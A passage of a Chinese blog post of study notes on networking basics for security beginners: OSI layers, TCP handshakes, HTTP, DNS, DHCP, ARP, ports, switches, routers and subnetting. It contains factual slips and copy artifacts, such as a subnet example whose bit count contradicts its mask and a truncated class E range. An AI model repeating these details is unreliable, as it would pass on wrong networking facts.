      <a data-url="http://example.com/2020/12/01/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" data-id="ckia6qyyz00011sutbgx2eu9a" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows%E4%B8%8EKali%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" rel="tag">Windows与Kali远程桌面连接</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-dingyi" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/30/dingyi/" class="article-date">
  <time datetime="2020-11-30T07:05:05.000Z" itemprop="datePublished">2020-11-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/30/dingyi/">网安方向部分概念</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="#OSI%E6%A8%A1%E5%9E%8B%E5%88%86%E5%B1%82">OSI模型分层</a></p>
<p><a href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B">三次握手</a></p>
<p><a href="#%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B">四次挥手</a></p>
<p><a href="#HTTP%E5%8D%8F%E8%AE%AE">http协议</a></p>
<p><a href="#HTTPS%E5%8D%8F%E8%AE%AE">https协议</a></p>
<p><a href="#DNS%E5%8D%8F%E8%AE%AE">DNS协议</a></p>
<p><a href="#DHCP%E5%8D%8F%E8%AE%AE">DHCP协议</a></p>
<p><a href="#ARP%E5%8D%8F%E8%AE%AE">ARP协议</a></p>
<p><a href="#TCP/UDP%E5%8C%BA%E5%88%AB">TCP/UDP区别</a></p>
<p><a href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%B7%E5%92%8C%E5%AF%B9%E5%BA%94%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E4%BD%9C%E7%94%A8">常见端口号和对应服务的概念和作用</a></p>
<p><a href="#%E4%BA%A4%E6%8D%A2%E6%9C%BA">交换机</a></p>
<p><a href="#%E8%B7%AF%E7%94%B1%E5%99%A8">路由器</a></p>
<p><a href="#IP%E5%9C%B0%E5%9D%80%E3%80%81%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81%E3%80%81%E7%BD%91%E5%85%B3%E6%A6%82%E5%BF%B5%E5%8F%8A%E7%94%A8%E5%A4%84">IP地址、子网掩码、网关概念及用处</a></p>
<p><a href="#IPS%E4%B8%8EIDS">IPS与IDS</a></p>
<p><a href="#%E5%A0%A1%E5%9E%92%E6%9C%BA">堡垒机</a></p>
<p><a href="#DMZ%E5%8C%BA">DMZ区</a></p>
<p><a href="#VMware%E4%B8%89%E7%A7%8D%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E8%AF%A6%E8%A7%A3">VMware三种连接方式详解</a></p>
<h1 id="OSI模型分层"><a href="#OSI模型分层" class="headerlink" title="OSI模型分层"></a>OSI模型分层</h1><p>OSI定义了网络互连的七层框架（<font color=#FF0004 ><strong>物理层、数据链路层、网络层、传输层、会话层、表示层、应用层</strong></font>）</p>
<p> （1）<font color=#0000FF ><strong>应用层:</strong></font> OSI参考模型中最靠近用户的一层，是为计算机用户提供应用接口，也为用户直接提供各种网络服务。我们常见应用层的网络服务协议有：HTTP，HTTPS，FTP，POP3、SMTP等。</p>
<p> （2）<font color=#0000FF ><strong>表示层:</strong></font> 表示层提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p>
<p>  （3）<font color=#0000FF ><strong>会话层:</strong></font> 会话层就是负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。     </p>
<p>  （4）<font color=#0000FF ><strong>传输层:</strong></font> 传输层建立了主机端到端的链接，传输层的作用是为上层协议提供端到端的可靠和透明的数据传输服务，包括处理差错控制和流量控制等问题。该层向高层屏蔽了下层数据通信的细节，使高层用户看到的只是在两个传输实体间的一条主机到主机的、可由用户控制和设定的、可靠的数据通路。我们通常说的，TCP UDP就是在这一层。端口号既是这里的“端”。</p>
<p>  （5)<font color=#0000FF ><strong>网络层:</strong></font>  本层通过IP寻址来建立两个节点之间的连接，为源端的运输层送来的分组，选择合适的路由和交换节点，正确无误地按照地址传送给目的端的运输层。就是通常说的IP层。这一层就是我们经常说的IP协议层。IP协议是Internet的基础。路由器属于这一层。</p>
<p>  (6)<font color=#0000FF ><strong>数据链路层:</strong></font> 将比特组合成字节,再将字节组合成帧,使用链路层地址 (以太网使用MAC地址)来访问介质,并进行差错检测。数据链路层又分为2个子层：逻辑链路控制子层（LLC）和媒体访问控制子层（MAC）。MAC子层处理CSMA/CD算法、数据出错校验、成帧等；LLC子层定义了一些字段使上次协议能共享数据链路层。 在实际使用中，LLC子层并非必需的。交换机属于这一层</p>
<p>(7)<font color=#0000FF ><strong>物理层 :</strong></font> 实际最终信号的传输是通过物理层实现的。通过物理介质传输比特流。规定了电平、速度和电缆针脚。常用设备有（各种物理设备）集线器、中继器、调制解调器、网线、双绞线、同轴电缆。这些都是物理层的传输介质。</p>
<h1 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h1><hr>
<p><img src="https://pics1.baidu.com/feed/d8f9d72a6059252d20d93b0a6645fb3e59b5b9d2.jpeg?token=c86d4509157378798ebbccbe843486d1&s=9746F8123F5754CA48D574DA0300D0B2"><br>第一次握手：建立连接时，客户端发送syn包（syn=x）到服务器，并进入SYN_SENT状态，等待服务器确认。</p>
<p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=x+1），同时自己也发送一个SYN包（syn=y），即SYN+ACK包，此时服务器进入SYN_RECV状态。</p>
<p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=y+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p>
<p><font color=#FF0000>自我理解：客户端向服务器发送请求，请求打开，服务器给予回应，客户端再向服务器发送数据确认。</font></p>
<hr>
<h1 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h1><p><img src="https://img-blog.csdn.net/20180717204202563?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTUwMzE2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"><br>（1）客户端进程发出连接释放报文，并且停止发送数据。释放数据报文首部，FIN=1，其序列号为seq=u（等于前面已经传送过来的数据的最后一个字节的序号加1），此时，客户端进入FIN-WAIT-1（终止等待1）状态。 TCP规定，FIN报文段即使不携带数据，也要消耗一个序号。</p>
<p>（2）服务器收到连接释放报文，发出确认报文，ACK=1，ack=u+1，并且带上自己的序列号seq=v，此时，服务端就进入了CLOSE-WAIT（关闭等待）状态。TCP服务器通知高层的应用进程，客户端向服务器的方向就释放了，这时候处于半关闭状态，即客户端已经没有数据要发送了，但是服务器若发送数据，客户端依然要接受。这个状态还要持续一段时间，也就是整个CLOSE-WAIT状态持续的时间。</p>
<p>（3）客户端收到服务器的确认请求后，此时，客户端就进入FIN-WAIT-2（终止等待2）状态，等待服务器发送连接释放报文（在这之前还需要接受服务器发送的最后的数据）。</p>
<p>（4）服务器将最后的数据发送完毕后，就向客户端发送连接释放报文，FIN=1，ack=u+1，由于在半关闭状态，服务器很可能又发送了一些数据，假定此时的序列号为seq=w，此时，服务器就进入了LAST-ACK（最后确认）状态，等待客户端的确认。</p>
<p>（5）客户端收到服务器的连接释放报文后，必须发出确认，ACK=1，ack=w+1，而自己的序列号是seq=u+1，此时，客户端就进入了TIME-WAIT（时间等待）状态。注意此时TCP连接还没有释放，必须经过2∗∗MSL（最长报文段寿命）的时间后，当客户端撤销相应的TCB后，才进入CLOSED状态。</p>
<p>（6）服务器只要收到了客户端发出的确认，立即进入CLOSED状态。同样，撤销TCB后，就结束了这次的TCP连接。可以看到，服务器结束TCP连接的时间要比客户端早一些。</p>
<p><font color=#ff0000>自己理解：客户端向服务器发送请求关闭数据，服务器先回应接收到关闭数据，回应结束后，服务器向客户端发送释放数据，客户端接收到数据后，向服务器发送确定的数据，服务器关闭。</font></p>
<hr>
<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p><font color=#ff0000><strong>定义：</strong></font>http是一个简单的请求-响应协议，它通常运行在TCP之上。它指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应。请求和响应消息的头以ASCII码形式给出；而消息内容则具有一个类似MIME的格式。这个简单模型是早期Web成功的有功之臣，因为它使开发和部署非常地直截了当。</p>
<p><font color=#ff0000><strong>HTTP协议URL：</strong></font>http（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式。</p>
<p>HTTP URL (URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息)的格式如下：</p>
<p><a href="http://host[&quot;:&quot;port][abs_path]">http://host[&quot;:&quot;port][abs_path]</a></p>
<p>http表示要通过HTTP协议来定位网络资源；host表示合法的Internet主机域名或者IP地址；port指定一个端口号，为空则使用缺省端口80；abs_path指定请求资源的URI；如果URL中没有给出abs_path，那么当它作为请求URI时，必须以“/”的形式给出，通常这个工作浏览器自动帮我们完成。</p>
<p><font color=#ff0000><strong>HTTP协议请求方法：</strong></font></p>
<p>请求方法（所有方法全为大写）有多种，各个方法的解释如下：</p>
<p>GET     请求获取Request-URI所标识的资源</p>
<p>POST    在Request-URI所标识的资源后附加新的数据</p>
<p>HEAD    请求获取由Request-URI所标识的资源的响应消息报头</p>
<p>PUT     请求服务器存储一个资源，并用Request-URI作为其标识</p>
<p>DELETE  请求服务器删除Request-URI所标识的资源</p>
<p>TRACE   请求服务器回送收到的请求信息，主要用于测试或诊断</p>
<p>CONNECT 保留将来使用</p>
<p>OPTIONS 请求查询服务器的性能，或者查询与资源相关的选项和需求</p>
<p><font color=#ff0000>应用举例：</font><br>GET方法：在浏览器的地址栏中输入网址的方式访问网页时，浏览器采用GET方法向服务器获取资源，eg:GET /form.html HTTP/1.1 (CRLF)</p>
<p>POST方法要求被请求服务器接受附在请求后面的数据，常用于提交表单。</p>
<p><font color=#ff0000><strong>HTTP协议响应：</strong></font></p>
<p><font color=#ff0000>状态行格式如下：</font></p>
<p>HTTP-Version Status-Code Reason-Phrase CRLF</p>
<p>其中，HTTP-Version表示服务器HTTP协议的版本；Status-Code表示服务器发回的响应状态代码；Reason-Phrase表示状态代码的文本描述。</p>
<p>状态代码有三位数字组成，第一个数字定义了响应的类别，且有五种可能取值：</p>
<p>1xx：指示信息–表示请求已接收，继续处理</p>
<p>2xx：成功–表示请求已被成功接收、理解、接受</p>
<p>3xx：重定向–要完成请求必须进行更进一步的操作</p>
<p>4xx：客户端错误–请求有语法错误或请求无法实现</p>
<p>5xx：服务器端错误–服务器未能实现合法的请求</p>
<p><font color=#ff0000>常见状态代码、状态描述、说明：</font></p>
<p>200 OK      //客户端请求成功</p>
<p>400 Bad Request  //客户端请求有语法错误，不能被服务器所理解</p>
<p>401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 </p>
<p>403 Forbidden  //服务器收到请求，但是拒绝提供服务</p>
<p>404 Not Found  //请求资源不存在，eg：输入了错误的URL</p>
<p>500 Internal Server Error //服务器发生不可预期的错误</p>
<p>503 Server Unavailable  //服务器当前不能处理客户端的请求，一段时间后可能恢复正常</p>
<h1 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h1><p><font color=#ff0000><strong>定义:</strong></font>HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 [1]  。HTTPS 在HTTP 的基础下加入SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加密/身份验证层（在 HTTP与 TCP 之间）。这个系统提供了身份验证与加密通讯方法。它被广泛用于万维网上安全敏感的通讯，例如交易支付等方面。</p>
<p><font color=#ff0000><strong>HTTPS和HTTP的区别</strong></font></p>
<p>一、https协议需要到ca申请证书，一般免费证书很少，需要交费。</p>
<p>二、http是超文本传输协议，信息是明文传输，https 则是具有安全性的ssl加密传输协议。</p>
<p>三、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</p>
<p>四、http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</p>
<h1 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h1><p><font color=#ff0000 size=4><strong>定义：</strong></font>域名系统（Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。DNS协议是用来将域名转换为IP地址（也可以将IP地址转换为相应的域名地址）。</p>
<p><font color=#ff0000 size=4><strong>简介：</strong></font>NS是一种可以将域名和IP地址相互映射的以层次结构分布的数据库系统。DNS系统采用递归查询请求的方式来响应用户的查询，为互联网的运行提供关键性的基础服务。目前绝大多数的防火墙和网络都会开放DNS服务，DNS数据包不会被拦截，因此可以基于DNS协议建立隐蔽信道，从而顺利穿过防火墙，在客户端和服务器之间传输数据。<br>DNS允许终端用户设备将给定的人类可读URL转换为网络可以理解的机器可用IP地址。Internet Engineering Task Force(IETF)标准组对HTTP和DNS进行了标准化定义。原始的DNS标准是在1987年发布的，因为用户在使用网络浏览器的同时需要使用其他应用程序，例如将电子邮件地址转换为IP地址。</p>
<h1 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h1><p><font color=#ff0000 size=4><strong>定义：</strong></font>DHCP（动态主机配置协议）是一个局域网的网络协议。指的是由服务器控制一段IP地址范围，客户机登录服务器时就可以自动获得服务器分配的IP地址和子网掩码。默认情况下，DHCP作为Windows Server的一个服务组件不会被系统自动安装，还需要管理员手动安装并进行必要的配置。</p>
<p><font color=#ff0000 size=4><strong>功能：</strong></font>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）通常被应用在大型的局域网络环境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率。</p>
<p>DHCP协议采用客户端/服务器模型，主机地址的动态分配任务由网络主机驱动。当DHCP服务器接收到来自网络主机申请地址的信息时，才会向网络主机发送相关的地址配置等信息，以实现网络主机地址信息的动态配置。DHCP具有以下功能：<font size=4></p>
<ol>
<li><p>保证任何IP地址在同一时刻只能由一台DHCP客户机所使用。</p>
</li>
<li><p>DHCP应当可以给用户分配永久固定的IP地址。 </p>
</li>
<li><p>DHCP应当可以同用其他方法获得IP地址的主机共存（如手工配置IP地址的主机）。</p>
</li>
<li><p>DHCP服务器应当向现有的BOOTP客户端提供服务。<br>DHCP有三种机制分配IP地址：</font></p>
</li>
</ol>
<p>(1) 自动分配方式（Automatic Allocation），DHCP服务器为主机指定一个永久性的IP地址，一旦DHCP客户端第一次成功从DHCP服务器端租用到IP地址后，就可以永久性的使用该地址。</p>
<p>(2) 动态分配方式（Dynamic Allocation），DHCP服务器给主机指定一个具有时间限制的IP地址，时间到期或主机明确表示放弃该地址时，该地址可以被其他主机使用。</p>
<p>(3) 手工分配方式（Manual Allocation），客户端的IP地址是由网络管理员指定的，DHCP服务器只是将指定的IP地址告诉客户端主机。<br>三种地址分配方式中，只有动态分配可以重复使用客户端不再需要的地址。<br>DHCP消息的格式是基于BOOTP（Bootstrap Protocol）消息格式的，这就要求设备具有BOOTP中继代理的功能，并能够与BOOTP客户端和DHCP服务器实现交互。BOOTP中继代理的功能，使得没有必要在每个物理网络都部署一个DHCP服务器。RFC 951和RFC 1542对BOOTP协议进行了详细描述。</p>
<h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><p><font color=#ff0000 size=4><strong>定义：</strong></font>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。相关协议有RARP、代理ARP。NDP用于在IPv6中代替地址解析协议。</p>
<p><font color=#ff0000 size=4><strong>功能：</strong></font>地址解析协议由互联网工程任务组（IETF）在1982年11月发布的RFC 826中描述制定。地址解析协议是IPv4中必不可少的协议，而IPv4是使用较为广泛的互联网协议版本（IPv6仍处在部署的初期）。</p>
<p>OSI模型把网络工作分为七层，IP地址在OSI模型的第三层，MAC地址在第二层，彼此不直接打交道。在通过以太网发送IP数据包时，需要先封装第三层（32位IP地址）、第二层（48位MAC地址）的报头，但由于发送时只知道目标IP地址，不知道其MAC地址，又不能跨第二、三层，所以需要使用地址解析协议。使用地址解析协议，可根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息，以保证通信的顺利进行。</p>
<h1 id="TCP-UDP区别"><a href="#TCP-UDP区别" class="headerlink" title="TCP/UDP区别"></a>TCP/UDP区别</h1><p><font color=#ff0000><strong>1、连接方面区别</strong></font></p>
<p>TCP面向连接（如打电话要先拨du号建立连接）。</p>
<p>UDP是无连接的，即发送dao数据之前不需要建立连接。</p>
<p><font color=#ff0000><strong>2、安全方面的区别</strong></font></p>
<p>TCP提供可靠的服务，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达。</p>
<p>UDP尽最大努力交付，即不保证可靠交付。</p>
<p><font color=#ff0000><strong>3、传输的区别</strong></font></p>
<p>TCP传输效率相对较低。</p>
<p>UDP传输效率高，适用于对高速传输和实时性有较高的通信或广播通信。</p>
<p>UDP的传输方式面向报文</p>
<p>TCP的传输方式面向字节流</p>
<p>TCP可靠传输，使用流量控制和拥塞控制</p>
<p>UDP不可靠传输，不使用流量控制和拥塞控制</p>
<p><font color=#ff0000><strong>4、连接对象数量的区别</strong></font></p>
<p>TCP连接只能是点到点、一对一的。</p>
<p>UDP支持一对一，一对多，多对一和多对多的交互通信。</p>
<p><font color=#ff0000><strong>5、适用场景的区别</strong></font></p>
<p>UDP适用于实时应用（IP电话、视频会议、直播等）</p>
<p>TCP适用于要求可靠传输的应用，例如文件传输</p>
<h1 id="常见端口号和对应服务的概念和作用"><a href="#常见端口号和对应服务的概念和作用" class="headerlink" title="常见端口号和对应服务的概念和作用"></a>常见端口号和对应服务的概念和作用</h1><p>20、21端口主要用于FTP（File Transfer Protocol，文件传输协议）服务。</p>
<p>22端口PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p>
<p>23端口主要用于Telnet（远程登录）服务，是Internet上普遍采用的登录和仿真程序。</p>
<p>25端口为SMTP（Simple Mail Transfer Protocol，简单邮件传输协议）服务器所开放，主要用于发送邮件，如今绝大多数邮件服务器都使用该协议。</p>
<p>53端口为DNS（Domain Name Server，域名服务器）服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。</p>
<p>67、68端口分别是为Bootp服务的Bootstrap Protocol Server（引导程序协议服务端）和Bootstrap Protocol Client（引导程序协议客户端）开放的端口。</p>
<p>80端口是为HTTP（HyperText Transport Protocol，超文本传输协议）开放的，这是上网冲浪使用最多的协议，主要用于在WWW（World WideWeb，万维网）服务上传输信息的协议。</p>
<p>111端口是SUN公司的RPC（Remote ProcedureCall，远程过程调用）服务所开放的端口，主要用于分布式系统中不同计算机的内部进程通信，RPC在多种网络服务中都是很重要的组件。</p>
<p>113端口主要用于Windows的“Authentication Service”（验证服务）。</p>
<p>119端口是为“Network News TransferProtocol”（网络新闻组传输协议，简称NNTP）开放的。</p>
<p>135端口主要用于使用RPC（Remote Procedure Call，远程过程调用）协议并提供DCOM（分布式组件对象模型）服务。</p>
<p>137端口主要用于“NetBIOS Name Service”（NetBIOS名称服务）</p>
<p>139端口是为“NetBIOS Session Service”提供的，主要用于提供Windows文件和打印机共享以及Unix中的Samba服务。</p>
<p>143端口主要是用于“Internet Message Access Protocol”v2（Internet消息访问协议，简称IMAP）。</p>
<p>161端口是用于“Simple Network Management Protocol”（简单网络管理协议，简称SNMP）。</p>
<p>443端口即网页浏览端口，主要是用于HTTPS服务，是提供加密和通过安全端口传输的另一种HTTP。</p>
<p>3389端口是远程桌面连接端口，可以通过这个端口，用”远程桌面”等连接工具来连接到远程的服务器，如果连接上了，输入系统管理员的用户名和密码后，将变得可以像操作本机一样操作远程的电脑，因此远程服务器一般都将这个端口修改数值或者关闭。</p>
<p>4000端口是用于大家经常使用的QQ聊天工具的，再细说就是为QQ客户端开放的端口，QQ服务端使用的端口是8000。</p>
<p>8080端口同80端口，是被用于WWW代理服务的，可以实现网页。</p>
<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><p><font color=#ff0000 size=4><strong>定义:</strong></font>交换是按照通信两端传输信息的需要，用人工或设备自动完成的方法，把要传输的信息送到符合要求的相应路由上的技术的统称。交换机根据工作位置的不同，可以分为广域网交换机和局域网交换机。广域的交换机就是一种在通信系统中完成信息交换功能的设备，它应用在数据链路层。交换机有多个端口，每个端口都具有桥接功能，可以连接一个局域网或一台高性能服务器或工作站。实际上，交换机有时被称为多端口网桥。</p>
<p>网络交换机，是一个扩大网络的器材，能为子网络中提供更多的连接端口，以便连接更多的计算机。随着通信业的发展以及国民经济信息化的推进，网络交换机市场呈稳步上升态势。它具有性价比高、高度灵活、相对简单和易于实现等特点。以太网技术已成为当今最重要的一种局域网组网技术，网络交换机也就成为了最普及的交换机。<br>Switch是交换机的英文名称，这个产品是由原集线器的升级换代而来，在外观上看和集线器没有很大区别。由于通信两端需要传输信息，而通过设备或者人工来把要传输的信息送到符合要求标准的对应的路由器上的方式，这个技术就是交换机技术。从广义上来分析，在通信系统里对于信息交换功能实现的设备，就是交换机。</p>
<p><font color=#ff0000 size=4><strong>分类：</strong></font>从广义上来看，网络交换机分为两种：<font color=#ff0000><strong>广域网交换机</strong></font>和<font color=#ff0000><strong>局域网交换机</strong></font>。广域网交换机主要应用于电信领域，提供通信用的基础平台。而局域网交换机则应用于局域网络，用于连接终端设备，如PC机及网络打印机等。从传输介质和传输速度上可分为以太网交换机、快速以太网交换机、千兆以太网交换机、FDDI交换机、ATM交换机和令牌环交换机等。从规模应用上又可分为企业级交换机、部门级交换机和工作组交换机等。各厂商划分的尺度并不是完全一致的，一般来讲，企业级交换机都是机架式，部门级交换机可以是机架式（插槽数较少），也可以是固定配置式，而工作组级交换机为固定配置式（功能较为简单）。另一方面，从应用的规模来看，作为骨干交换机时，支持500个信息点以上大型企业应用的交换机为企业级交换机，支持300个信息点以下中型企业的交换机为部门级交换机，而支持100个信息点以内的交换机为工作组级交换机。</p>
<h1 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h1><p><font color=#ff0000 size=4><strong>定义：</strong></font>路由器是连接两个或多个网络的硬件设备，在网络间起网关的作用，是读取每一个数据包中的地址然后决定如何传送的专用智能性的网络设备。它能够理解不同的协议，例如某个局域网使用的以太网协议，因特网使用的TCP/IP协议。这样，路由器可以分析各种不同类型网络传来的数据包的目的地址，把非TCP/IP网络的地址转换成TCP/IP地址，或者反之；再根据选定的路由算法把各数据包按最佳路线传送到指定位置。所以路由器可以把非TCP/ IP网络连接到因特网上。</p>
<p><font color=#ff0000 size=4><strong>简介：</strong></font>路由器又可以称之为网关设备。路由器就是在OSI/RM中完成的网络层中继以及第三层中继任务，对不同的网络之间的数据包进行存储、分组转发处理，其主要就是在不同的逻辑分开网络。而数据在一个子网中传输到另一个子网中，可以通过路由器的路由功能进行处理。在网络通信中，路由器具有判断网络地址以及选择IP路径的作用，可以在多个网络环境中，构建灵活的链接系统，通过不同的数据分组以及介质访问方式对各个子网进行链接。路由器在操作中仅接受源站或者其他相关路由器传递的信息，是一种基于网络层的互联设备。</p>
<p>路由器通常位于网络层，因而路由技术也是与网络层相关的一门技术， 路由器与早期的网桥相比有很多的变化和不同。 通常而言，网桥的局限性比较大，它只能够连通数据链路层相同或者类似的网络，不能够连接数据链路层之间有着较大差异的网络。但是路由器却不同，它打破了这个局限，能够连接任意的两种不同的网络，但是这两种不同的网络之间要遵守一个原则，就是使用相同的网络层协议，这样才能够被路由器连接。 路由技术简单来说就是对网络上众多的信息进行转发与交换的一门技术，具体来说，就是通过互联网络将信息从源地址传送到目的地址。路由技术这几年来也取得了不错的发展和进步，特别是第五代路由器的出现，满足了人们对数据、语音和图像的综合应用，逐渐被大多数家庭网络所选择并且广泛被使用。 除此之外，这几年来，我国的路由技术越来越成熟，同时也结合了当代的智能化技术，使得人们在使用路由技术的过程中能够体会到快捷、快速的效果，从而推动和促进互联网和网络技术的发展。</p>
<p>路由器是互联网的主要结点设备。路由器通过路由决定数据的转发。转发策略称为路由选择（routing），这也是路由器名称的由来。作为不同网络之间互相连接的枢纽，路由器系统构成了基于TCP/IP的国际互联网络Internet 的主体脉络，也可以说，路由器构成了Internet的骨架。它的处理速度是网络通信的主要瓶颈之一，它的可靠性则直接影响着网络互连的质量。因此，在园区网、地区网、乃至整个Internet研究领域中，路由器技术始终处于核心地位，其发展历程和方向，成为整个Internet研究的一个缩影。在当前我国网络基础建设和信息建设方兴未艾之际，探讨路由器在互连网络中的作用、地位及其发展方向，对于国内的网络技术研究、网络建设，以及明确网络市场上对于路由器和网络互连的各种似是而非的概念，都有重要的意义。</p>
<p><font color=#ff0000 size=4><strong>原理：</strong></font>络中的设备相互通信主要是用它们的IP地址，路由器只能根据具体的IP地址来转发数据。IP地址由网络地址和主机地址两部分组成。在Internet中采用的是由子网掩码来确定网络地址和主机地址。子网掩码与IP地址一样都是32位的，并且这两者是一一对应的，子网掩码中“1”对应IP地址中的网络地址，“0”对应的是主机地址，网络地址和主机地址就构成了一个完整的IP地址。在同一个网络中，IP地址的网络地址必须是相同的。计算机之间的通信只能在具有相同网络地址的IP地址之间进行，如果想要与其他网段的计算机进行通信，则必须经过路由器转发出去。不同网络地址的IP地址是不能直接通信的，即便它们距离非常近，也不能进行通信。路由器的多个端口可以连接多个网段，每个端口的IP地址的网络地址都必须与所连接的网段的网络地址一致。不同的端口它的网络地址是不同的，所对应的网段也是不同的，这样才能使各个网段中的主机通过自己网段的IP地址把数据发送到路由器上。</p>
<h1 id="IP地址、子网掩码、网关概念及用处"><a href="#IP地址、子网掩码、网关概念及用处" class="headerlink" title="IP地址、子网掩码、网关概念及用处"></a>IP地址、子网掩码、网关概念及用处</h1><h2 id="一、IP地址"><a href="#一、IP地址" class="headerlink" title="一、IP地址"></a>一、IP地址</h2><p><font color=#ff0000 size=4><strong>定义：</strong></font><br>IP协议中还有一个非常重要的内容，那就是给因特网上的每台计算机和其它设备都规定了一种唯一的地址，叫做“IP 地址”。IP地址又称为软件地址, 存储在计算机的存储器上, IPv4地址为32位, IPv6地址为128位</p>
<p> <font color=#ff0000 size=4><strong>IP地址和MAC地址</strong></font></p>
<pre><code> 网络层以上使用IP地址, 数据链路层以下使用MAC地址

 IP地址是逻辑地址, MAC地址是物理地址

 IP分组中首部的源地址和目的地址在传输中不会改变, MAC帧中首部的源地址和目的地址每到一个路由器会改变一次</code></pre>
<p><font color=#ff0000 size=4><strong>IP地址分类</strong></font></p>
<p>A类地址 : 0.0.0.0 ~ 127.255.255.255</p>
<p>B类地址 : 128.0.0.0 ~ 191.255.255.255</p>
<p>C类地址 : 192.0.0.0 ~ 223.255.255.255</p>
<p>D类地址：224.0.0.0~239.255.255.255</p>
<p>E类地址：240.0.0.0~247.255.255.255</p>
<h2 id="二、子网掩码"><a href="#二、子网掩码" class="headerlink" title="二、子网掩码"></a>二、子网掩码</h2><p><font color=#ff0000 size=4><strong>定义：</strong></font><br> 子网掩码(subnet mask)又叫网络掩码、地址掩码、子网络遮罩，它是一种用来指明一个IP地址的哪些位标识的是主机所在的子网，以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合IP地址一起使用。子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。通过子网掩码，就可以判断两个IP在不在一个局域网内部。子网掩码可以看出有多少位是网络号，有多少位是主机号。</p>
<p><font color=#ff0000 size=4><strong>确定方法：</strong></font>确定子网掩码的方法是其与IP地址中标识网络号的所有对应位都用”1”，而与主机号对应的位都是”0”。如分为2个子网的C类地址，用22位来标识网络号，则其子网掩码为：11111111 11111111 11111111 10000000即255.255.255.128。于是我们可以知道，A类地址缺省子网掩码为255.0.0.0,B类为255.255.0.0,C类为255.255.255.0。下表是C类地址子网划分及相关子网掩码：</p>
<p>子网位数 子网掩码 主机数 可用主机数</p>
<p>  1 255.255.255.128 128 126</p>
